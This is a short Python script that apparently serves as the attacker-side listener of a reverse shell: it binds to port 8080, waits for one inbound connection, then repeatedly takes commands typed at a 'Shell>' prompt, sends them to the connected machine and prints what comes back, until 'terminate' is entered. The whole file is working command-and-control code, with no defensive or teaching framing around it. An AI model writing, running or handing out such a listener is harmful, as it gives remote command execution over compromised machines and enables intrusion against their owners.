import socket
import os, subprocess

os.system("clear || cls")
def listener():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 8080))
	print("[+] Listening for TCP connection on port 8080")
	s.listen(1)
	conn, addr = s.accept()

	print("[+] We got connection from: ", addr)

	ter = 'terminate'
	while True:
		cmd = input("\nShell> ")
		if ter in cmd:
			conn.send(ter.encode("utf-8"))
			conn.close()
			break
		else:
			print(str.encode(cmd))
			conn.send(str.encode(cmd))
			client = str(conn.recv(4096).decode("utf-8"))
			print(client + "=================wth=================")
			
listener()